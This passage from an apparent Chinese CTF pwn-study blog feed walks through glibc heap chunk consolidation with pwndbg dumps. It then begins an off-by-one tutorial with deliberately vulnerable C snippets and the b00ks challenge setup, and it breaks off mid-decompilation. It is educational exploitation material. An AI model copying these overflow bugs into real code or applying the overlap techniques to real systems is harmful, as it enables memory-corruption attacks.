class=\"line\">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758160: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758180: 0x0000000000000000  0x0000000000020e81</span><br><span class=\"line\">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\tfree 了 chunk1 之后，chunk2 的 p 位已经变成 0 了：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x91</span><br><span class=\"line\">fd: 0x7ffff7dd1b78</span><br><span class=\"line\">bk: 0x7ffff7dd1b78</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x555555758090</span><br><span class=\"line\">Size: 0x20</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580d0</span><br><span class=\"line\">Size: 0x91</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758160</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758180</span><br><span class=\"line\">Size: 0x20e81</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/54gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000091\t\t\t&lt;======Chunk1</span><br><span class=\"line\">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk2</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000091\t\t\t&lt;======Chunk3</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758160: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk4</span><br><span class=\"line\">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758180: 0x0000000000000000  0x0000000000020e81\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后修改了 chunk3 的 pre_inuse，也就是 size 的最低为 P 位为 0，然后修改 pre_size 位为 0xd8，</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x91</span><br><span class=\"line\">fd: 0x7ffff7dd1b78</span><br><span class=\"line\">bk: 0x7ffff7dd1b78</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x555555758090</span><br><span class=\"line\">Size: 0x20</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x5555557580d0</span><br><span class=\"line\">Size: 0x90</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758160</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758180</span><br><span class=\"line\">Size: 0x20e81</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/54gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000091\t\t\t&lt;======Chunk1</span><br><span class=\"line\">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk2</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x00000000000000d0  0x0000000000000090\t\t\t&lt;======Chunk3</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758160: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk4</span><br><span class=\"line\">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758180: 0x0000000000000000  0x0000000000020e81\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t可以看出来，chunk3 的 pre_size 域的大小刚好能够包含到完 chunk1 和 chunk2。之后 free 掉了 chunk3：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x161</span><br><span class=\"line\">fd: 0x7ffff7dd1b78</span><br><span class=\"line\">bk: 0x7ffff7dd1b78</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x555555758160</span><br><span class=\"line\">Size: 0x20</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758180</span><br><span class=\"line\">Size: 0x20e81</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br></pre></td></tr></table></figure>\n<p>会发现，前面的三个 chunk 都被合并成了一个，这里主要是因为 unlink 的原因，导致了 chunk3 和前面的两个（主要是 pre_size 指定的大小范围内的）chunk 发生了合并。之后再进行 malloc，会分配走新的那个 chunk1：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x161</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758160</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758180</span><br><span class=\"line\">Size: 0x20e81</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/f1497b96.html",
            "url": "http://blog.g01den.top/posts/f1497b96.html",
            "title": "pwn学习笔记（11）--off_by_one",
            "date_published": "2024-11-09T13:31:09.000Z",
            "content_html": "<h1 id=\"pwn学习笔记11off_by_one\"><a class=\"markdownIt-Anchor\" href=\"#pwn学习笔记11off_by_one\">#</a> pwn 学习笔记（11）–off_by_one</h1>\n<p>​\t\t在处理 for 循环或者 while 循环的时候，有的可能会遇到如下情况：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x10</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span> ; i &lt;= <span class=\"number\">0x10</span> ; i ++)&#123;</span><br><span class=\"line\">        buf[i] = getchar();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(buf);</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t多次输入几个 a 之后，发现了最后输出的时候输出了 17 个 a，我的目的仅仅只是需要 16 个 a，结果输出了 17 个 a，像这种，在写入字符串的时候多写入了一个字节的情况，就是 off by one。</p>\n<p>​\t\t在堆中，这种问题尤为严重，可能会导致输入的字符覆盖了 heap info 的 prev_in_use 或者其他的数据：</p>\n<blockquote>\n<ol>\n<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>\n<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得  <code>prev_in_use</code>  位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时  <code>prev_size</code>  域就会启用，就可以伪造  <code>prev_size</code>  ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照  <code>prev_size</code>  找到的块的大小与 <code>prev_size</code>  是否一致。</li>\n</ol>\n</blockquote>\n<p>​\t\t最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* consolidate backward */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">      prevsize = prev_size (p);</span><br><span class=\"line\">      size += prevsize;</span><br><span class=\"line\">      p = chunk_at_offset(p, -((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">      <span class=\"comment\">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class=\"line\">        malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class=\"line\">      unlink_chunk (av, p);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t还有种情况：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> bss[<span class=\"number\">0x20</span>] = <span class=\"string\">&quot;aaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x10</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(bss) == <span class=\"number\">0x10</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(buf,bss);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这种情况，乍看上去没啥问题，但是，strlen 不会计算结尾的 \\x00，而 strcpy 在拷贝的时候又会多拷贝一个 \\x00 进去，造成多写入了一个字节。</p>\n<p>​\t\t上一个题：</p>\n<h2 id=\"asis-ctf-2016-b00ks只看前面off-by-one的部分\"><a class=\"markdownIt-Anchor\" href=\"#asis-ctf-2016-b00ks只看前面off-by-one的部分\">#</a> Asis CTF 2016 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3RyZWUvbWFzdGVyL3B3bi9oZWFwL29mZl9ieV9vbmUvQXNpc18yMDE2X2IwMGtz\">b00ks</span>（只看前面 off by one 的部分）</h2>\n<p>​\t\tchecksec 一下看看：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g01den@MSI:/mnt/c/Users/20820/Downloads$ checksec pwn</span><br><span class=\"line\">[*] &#x27;/mnt/c/Users/20820/Downloads/pwn&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>​\t\t激活了 PIE，以及题目附件被 strip 过，抱歉，我一个菜鸡误入了大佬的世界，啥都看不懂，反编译之后看到那么抽象突然想放弃了，不过还是得做。</p>\n<p>​\t\t题目是一个寻常的图书管理，有创建书，删除书，编辑描述内容，输出书籍信息，修改最近访问的作者名，退出。</p>\n<p>​\t\t先不看别的，main 没啥用，先看 add：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">sub_F55</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v3; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *ptr; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\nEnter book name size: &quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span 